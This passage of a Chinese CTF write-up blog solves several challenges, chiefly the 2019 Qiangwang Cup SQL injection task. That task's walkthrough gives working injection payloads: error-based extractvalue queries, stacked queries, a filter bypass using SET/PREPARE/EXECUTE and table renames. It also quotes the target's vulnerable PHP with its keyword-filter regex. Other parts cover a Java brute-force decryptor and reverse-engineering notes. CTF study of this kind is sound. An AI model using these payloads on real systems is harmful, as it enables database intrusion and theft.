class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.PBEKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">getPassword</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j,<span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">		String str1;</span><br><span class="line">        String str2 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">9</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            str1 = <span class="string">&quot;*&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            str1 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str1 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            str1 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str1 = <span class="string">&quot;!&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str1 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str1 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str1 = <span class="string">&quot;-&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str1 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">switch</span> (k % <span class="number">7</span>) &#123;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            str2 = <span class="string">&quot;@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            str2 = <span class="string">&quot;&amp;&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            str2 = <span class="string">&quot;#&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            str2 = <span class="string">&quot;+&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            str2 = <span class="string">&quot;_&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            str2 = <span class="string">&quot;$&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        String str3 = repeatString(<span class="string">&quot;flare&quot;</span>, i / k);</span><br><span class="line">        String str4 = repeatString(rotN(<span class="string">&quot;bear&quot;</span>, i * j), j * <span class="number">2</span>);</span><br><span class="line">        String str5 = repeatString(<span class="string">&quot;yeah&quot;</span>, k);</span><br><span class="line">        StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        stringBuilder.append(str3);</span><br><span class="line">        stringBuilder.append(str1);</span><br><span class="line">        stringBuilder.append(str4);</span><br><span class="line">        stringBuilder.append(str2);</span><br><span class="line">        stringBuilder.append(str5);</span><br><span class="line">        <span class="keyword">return</span> stringBuilder.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">rotN</span><span class="params">(String string, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		ArrayList&lt;Character&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;&gt;(string.length());</span><br><span class="line">	    <span class="keyword">int</span> i;</span><br><span class="line">	    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; string.length(); i++) &#123;</span><br><span class="line">	      <span class="keyword">char</span> c1 = string.charAt(i);</span><br><span class="line">	      <span class="keyword">char</span> c = c1;</span><br><span class="line">	      <span class="keyword">if</span> (Character.isLowerCase(c1)) &#123;</span><br><span class="line">	        c1 = (<span class="keyword">char</span>)(c1 + n);</span><br><span class="line">	        c = c1;</span><br><span class="line">	        <span class="keyword">if</span> (c1 &gt; <span class="string">&#x27;z&#x27;</span>)</span><br><span class="line">	          c = (<span class="keyword">char</span>)(c1 - n * <span class="number">2</span>); </span><br><span class="line">	      &#125; </span><br><span class="line">	      arrayList.add(Character.valueOf(c));</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">char</span> array[] = <span class="keyword">new</span> <span class="keyword">char</span>[arrayList.size()];</span><br><span class="line">	    i=<span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">for</span>(<span class="keyword">char</span> c:arrayList) &#123;</span><br><span class="line">	    	array[i++]=c;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">return</span> <span class="keyword">new</span> String(array);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">static</span> String <span class="title">repeatString</span><span class="params">(String string, <span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">		StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;i;j++) &#123;</span><br><span class="line">			sb.append(string);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> sb.toString();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">byte</span>[] decrypt(String key,<span class="keyword">byte</span>[] data) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">	    Charset charset1 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">	    <span class="keyword">byte</span>[] arrayOfByte2 = <span class="string">&quot;pawsitive_vibes!&quot;</span>.getBytes(charset1);</span><br><span class="line">	    IvParameterSpec ivParameterSpec = <span class="keyword">new</span> IvParameterSpec(arrayOfByte2);</span><br><span class="line">	    <span class="keyword">char</span>[] arrayOfChar = key.toCharArray();</span><br><span class="line">	    Charset charset2 = Charset.forName(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">	    <span class="keyword">byte</span>[] arrayOfByte3 = <span class="string">&quot;NaClNaClNaCl&quot;</span>.getBytes(charset2);</span><br><span class="line">	    PBEKeySpec pBEKeySpec = <span class="keyword">new</span> PBEKeySpec(arrayOfChar, arrayOfByte3, <span class="number">1234</span>, <span class="number">256</span>);</span><br><span class="line">	    SecretKey secretKey = SecretKeyFactory.getInstance(<span class="string">&quot;PBKDF2WithHmacSHA1&quot;</span>).generateSecret(pBEKeySpec);</span><br><span class="line">	    secretKey = <span class="keyword">new</span> SecretKeySpec(secretKey.getEncoded(), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">	    Cipher cipher = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">	    cipher.init(<span class="number">2</span>, secretKey, ivParameterSpec);</span><br><span class="line">	    <span class="keyword">byte</span>[] arrayOfByte1 = cipher.doFinal(data);</span><br><span class="line">	    <span class="keyword">return</span> arrayOfByte1;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> ia[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">5</span>&#125;;</span><br><span class="line">		<span class="keyword">int</span> ja[] = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>&#125;;</span><br><span class="line">		FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic&quot;</span>);</span><br><span class="line">		<span class="keyword">byte</span>[] ecs1 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">		fis.read(ecs1);</span><br><span class="line">		fis.close();</span><br><span class="line">		fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;ecstatic2&quot;</span>);</span><br><span class="line">		<span class="keyword">byte</span>[] ecs2 =<span class="keyword">new</span> <span class="keyword">byte</span>[fis.available()];</span><br><span class="line">		fis.read(ecs2);</span><br><span class="line">		fis.close();</span><br><span class="line">		FileOutputStream fos;</span><br><span class="line">		<span class="keyword">byte</span>[] tmp1 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs1.length];</span><br><span class="line">		<span class="keyword">byte</span>[] tmp2 = <span class="keyword">new</span> <span class="keyword">byte</span>[ecs2.length];</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> cnt=<span class="number">0</span>;cnt&lt;ia.length;cnt++) &#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">7</span>;k++) &#123;</span><br><span class="line">				String key = getPassword(ia[cnt],ja[cnt],k);</span><br><span class="line">				System.out.println(key);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">					tmp1 = decrypt(key,ecs1);</span><br><span class="line">					tmp2 = decrypt(key,ecs2);</span><br><span class="line">				&#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">					System.out.println(<span class="string">&quot;Decryption Failed&quot;</span>);</span><br><span class="line">					<span class="keyword">continue</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_1.bmp&quot;</span>);</span><br><span class="line">				fos.write(tmp1);</span><br><span class="line">				fos.close();</span><br><span class="line">				fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;dec/&quot;</span>+ia[cnt]+<span class="string">&quot;&quot;</span>+ja[cnt]+<span class="string">&quot;&quot;</span>+k+<span class="string">&quot;_2.bmp&quot;</span>);</span><br><span class="line">				fos.write(tmp2);</span><br><span class="line">				fos.close();</span><br><span class="line">				System.out.println(<span class="string">&quot;[*] Decryption Success&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最后得到两张图片，分别是带flag图像的两帧</p>
<h2 id="web-强网杯-2019-随便注"><a href="#web-强网杯-2019-随便注" class="headerlink" title="[web][强网杯 2019]随便注"></a>[web][强网杯 2019]随便注</h2><p>今天时间不太够，先做一道web充数，改天补上</p>
<p>SQL注入问题，首先尝试是否存在注入</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1 <span class="comment">#</span></span><br><span class="line">1&#x27; and 1=2 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>第二行没有输出，说明存在注入</p>
<p>尝试获取列数</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 2 <span class="comment">#</span></span><br><span class="line">1&#x27; order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>最后一个报错，说明只有两列</p>
<p>尝试获取数据库名<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure><br>发现有过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>
<p>尝试报错注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用户名</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,user(),0x7e))); <span class="comment">#</span></span><br><span class="line">数据库</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,database(),0x7e))); <span class="comment">#</span></span><br><span class="line">版本</span><br><span class="line">1&#x27; and (extractvalue(1,concat(0x7e,version(),0x7e))); <span class="comment">#</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>extractvalue(),updatexml()都是报错注入常用函数</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>名称</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>extractvalue()</td>
<td>使用XPath表示法从xml字符串中提取值</td>
</tr>
<tr>
<td>updatexml</td>
<td>返回替换的xml片段</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<ol>
<li>extractvalue函数<br>extractvalue(xml_flag,xpath_expr)<br>extractvalue(‘<a><b></b></a>‘,’/a/b’)<br>就是寻找当前文档下a节点下的b节点，如果书写错误，就会报错，从而提供一些信息<br>select extractvalue(‘\<a\\\>\<b\><b></b>‘,concat(‘~’,(database())));</b\></a\\\></li>
<li>updatexml函数<br>updatexml(xml_target,xpath_expr,new_xml)<br>当xpath语法错误时，就会报错，含有错误信息<br>updatexml(‘test’,concat(‘~’,(database())),’test’)</li>
</ol>
</blockquote>
<p>使用堆叠注入绕过过滤，堆叠注入即一次执行多个命令</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;; <span class="keyword">show</span> <span class="keyword">tables</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>多个命令使用分号隔开，这里第一个语句成功的话会增加很多输出，所以可以让前一个语句失败</p>
<p>查看表的字段<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;desc `1919810931114514` <span class="comment">#</span></span><br><span class="line">-1&#x27;;desc `words` <span class="comment">#</span></span><br><span class="line">也可以如下</span><br><span class="line">-1&#x27;;<span class="keyword">show</span> <span class="keyword">columns</span> <span class="keyword">from</span> <span class="string">`1919810931114514`</span><span class="comment">#</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27;;show columns from `words` #</span></span><br></pre></td></tr></table></figure><br>表名加反引号</p>
<blockquote>
<p>sql中desc用于查看表的详细信息<br>desc也是asc的反义词，排列时候有用</p>
</blockquote>
<p>接下来要读取字段内的数据，应该执行的语句如下</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">`1919810931114514`</span>;</span><br></pre></td></tr></table></figure>
<p>由于select过滤，所以需要采用预编译机制</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set用于设置变量名和值</span><br><span class="line">prepare预备一个语句，赋予名称，引用该语句</span><br><span class="line">execute执行语句</span><br><span class="line">deallocate prepare释放预处理的语句</span><br></pre></td></tr></table></figure>
<p>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">set</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">prepare</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure><br>set @sql设置了名为sql的变量值为后面的语句拼合，然后prepare预备语句，执行语句</p>
<p>结果又是过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>)</span><br></pre></td></tr></table></figure><br>但是不区分大小写，转化为大写</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">SET</span> @<span class="keyword">sql</span>=<span class="keyword">concat</span>(<span class="string">&#x27;se&#x27;</span>,<span class="string">&#x27;lect*from `1919810931114514`;&#x27;</span>);<span class="keyword">PREPARE</span> stmt <span class="keyword">from</span> @<span class="keyword">sql</span>;<span class="keyword">execute</span> stmt; <span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<p>还可以修改表名和列名从而得到flag</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">修改表名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words</span><br><span class="line">修改列名</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">data</span> <span class="built_in">varchar</span>(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>
<p>payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;<span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;<span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);<span class="comment">#</span></span><br></pre></td></tr></table></figure><br>然后1’ or 1=1#</p>
<p>= =这种方法有风险，万一不能一气呵成就挂了</p>
<p>每次启动靶机flag不同= =</p>
<p>源码分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;easy_sql&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;取材于某次真实环境渗透，只说一句话：开发和安全缺一不可&lt;/h1&gt;</span><br><span class="line">&lt;!-- sqlmap是没有灵魂的 --&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;get&quot;</span>&gt;</span><br><span class="line">    姿势: &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;inject&quot;</span> value=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf1</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    preg_match(<span class="string">&quot;/select|update|delete|drop|insert|where|\./i&quot;</span>,$inject) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf2</span>(<span class="params">$inject</span>) </span>&#123;</span><br><span class="line">    strstr($inject, <span class="string">&quot;set&quot;</span>) &amp;&amp; strstr($inject, <span class="string">&quot;prepare&quot;</span>) &amp;&amp; <span class="keyword">die</span>(<span class="string">&#x27;strstr($inject, &quot;set&quot;) &amp;&amp; strstr($inject, &quot;prepare&quot;)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;inject&#x27;</span>])) &#123;</span><br><span class="line">    $id = $_GET[<span class="string">&#x27;inject&#x27;</span>];</span><br><span class="line">    waf1($id);</span><br><span class="line">    waf2($id);</span><br><span class="line">    $mysqli = <span class="keyword">new</span> mysqli(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;supersqli&quot;</span>);</span><br><span class="line">    <span class="comment">//多条sql语句</span></span><br><span class="line">    $sql = <span class="string">&quot;select * from `words` where id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    $res = $mysqli-&gt;multi_query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;<span class="comment">//使用multi_query()执行一条或多条sql语句</span></span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($rs = $mysqli-&gt;store_result())&#123;<span class="comment">//store_result()方法获取第一条sql语句查询结果</span></span><br><span class="line">          <span class="keyword">while</span> ($row = $rs-&gt;fetch_row())&#123;</span><br><span class="line">            var_dump($row);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          $rs-&gt;Close(); <span class="comment">//关闭结果集</span></span><br><span class="line">          <span class="keyword">if</span> ($mysqli-&gt;more_results())&#123;  <span class="comment">//判断是否还有更多结果集</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">while</span>($mysqli-&gt;next_result()); <span class="comment">//next_result()方法获取下一结果集，返回bool值</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;error &quot;</span>.$mysqli-&gt;errno.<span class="string">&quot; : &quot;</span>.$mysqli-&gt;error;</span><br><span class="line">    &#125;</span><br><span class="line">    $mysqli-&gt;close();  <span class="comment">//关闭数据库连接</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br>大佬说这里执行多条sql语句会导致安全问题</p>
<p>这里应该就是堆叠注入的源头了</p>
<p>参考资料</p>
<p>[1] <a target="_blank" rel="noopener" href="https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html">https://www.cnblogs.com/laoxiajiadeyun/p/10488731.html</a></p>
<p>[2] 2019强网杯”随便注”学习 - saucerman的文章 - 知乎<br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/78989602">https://zhuanlan.zhihu.com/p/78989602</a></p>
<h2 id="rev-2019红帽杯-calc"><a href="#rev-2019红帽杯-calc" class="headerlink" title="[rev][2019红帽杯]calc"></a>[rev][2019红帽杯]calc</h2><ol>
<li>IDA打开，C++，看到输入函数，但是下面太乱，推测有自定义的结构体</li>
<li>在cin那里下断点，读入的结构体很奇怪，进入读入结构体的函数，发现了真正的cin函数，其参数应该是一个st::string结构，长度小于16采用栈存储，大于16采用堆存储，这不重要</li>
<li>下面就可以分析出自定义的结构体</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">InputStru</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span>* start; <span class="comment">// 存储数据的起始地址</span></span><br><span class="line">    <span class="keyword">int</span>* end; <span class="comment">// 当前存储的最后一个元素</span></span><br><span class="line">    <span class="keyword">int</span>* maxEnd; <span class="comment">//最大容量</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ol>
<li>专用函数分析</li>
<li>140001700 moveInputStru arg2-&gt;arg1</li>
<li>1400017E0 subAbsInputStru 两数相减的绝对值</li>
<li>140001A90 相乘，a1=a2*a3</li>
<li>140003CE0 mallocMultiLen 乘法时分配空间用的</li>
<li>140001FF0 看起来像乘方调试出来也是乘方 a1=a2**a3</li>
<li>140001550 相加 a1=a2+a3</li>
<li>看答案是三个数的立方和等于42</li>
<li>最终的表达式分为两部分</li>
</ol>
<script type="math/tex; mode=display">
a=(x+y)^3-3x^2y-3xy^2\\
b=(z+4)^3-48z-12z^2\\
最后判断a==b</script><h2 id="rev-GKCTF2020-DbgIsFun"><a href="#rev-GKCTF2020-DbgIsFun" class="headerlink" title="[rev][GKCTF2020]DbgIsFun"></a>[rev][GKCTF2020]DbgIsFun</h2><p>调试后发现真正的比较函数，是rc4解密，但是解密之后发现不对</p>
<p>盲猜开头是flag，所以测试前4个字符和flag串的关系，发现是-128然后异或73，得到flag</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 